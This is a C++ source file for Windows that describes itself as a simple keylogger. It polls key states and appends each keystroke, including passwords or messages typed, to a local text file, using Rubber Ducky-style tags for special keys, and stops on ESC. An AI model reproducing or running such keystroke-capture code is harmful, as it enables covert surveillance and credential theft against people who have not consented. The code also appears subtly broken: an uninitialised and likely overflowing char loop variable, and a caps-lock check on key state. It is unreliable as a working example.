#include <iostream>
#include <windows.h>
#include <string>
#include <fstream>

//logs key inputs and formats it into rubby ducky language and saves it to a file
//this is a simple keylogger that logs the keys pressed and saves them to a file in a format that can be used with a rubber ducky
//it uses the windows api to capture key presses and formats them into a string that can be used with a rubber ducky
//it also uses the windows api to create a file and write the formatted string to the file
//create a start/end menu 

using namespace std;

int Save(string file);

int main() {
    string file = "keylog.txt"; //file to save the keylog to (must use .c_str() to conver to char*)
    //char *fileName = "keylog.txt"; //file to save the keylog to
    
    cout << "Keylogger started, will be saved to " << file << endl;
    Save(file); //main function which saves to file 
    cout << "Keylogger finished, key strokes save in " << file << endl; 

}

int Save(string file){
    ofstream fout;

    char i;
    char prevkey = 0;
    //end by pressing ESC key
    while(i != 27) { 
        Sleep(10);
        for(i = 8; i <= 255; i++) {
            //use standard windows api function to (only pressed keys)
            if(GetAsyncKeyState(i) == -32767) {
                //ios::out is used to create a file, if it already exists it will be overwritten
                //ios::app is used to append to file, cannot edit original contents 
                fout.open(file.c_str(), ios::app);
                if((i >= 8 && i <= 222) && (i != 16 && i != 20)) {
                    switch(i) {
                        case VK_BACK: fout << "[BACKSPACE]"; break;
                        case VK_TAB: fout << "  "; break;
                        case VK_RETURN: fout << "[ENTER]" << "\n"; break;
                        case VK_SHIFT: fout << "[SHIFT]"; break;
                        case VK_CONTROL: fout << "[CTRL]"; break;
                        case VK_MENU: fout << "[ALT]"; break;
                        case VK_CAPITAL: fout << "[CAPSLOCK]"; break;
                        case VK_ESCAPE: fout << "[ESCAPE]"; break;
                        case VK_SPACE: fout << " "; break;
                        default:
                            if(i >= 65 && i <= 90) {
                                if(GetAsyncKeyState(VK_CAPITAL)) {
                                    fout << char(i + 32);
                                } else {
                                    fout << char(i);
                                }
                            } else {
                                fout << "[" << char(i) << "]";
                            }
                            break;
                    }
                    if (i == 27)
                        break; //exit loop if ESC key is pressed

                    prevkey = i; //store previous key
                    }
                else {
                    //cout << "no key pressed" << endl;
                    //cout << GetAsyncKeyState(i) << endl;
                    //left click is GetAsyncKeyState(VK_LBUTTON) == -32768

                }
                fout.close();
            }
        }
    }
    return 0;
}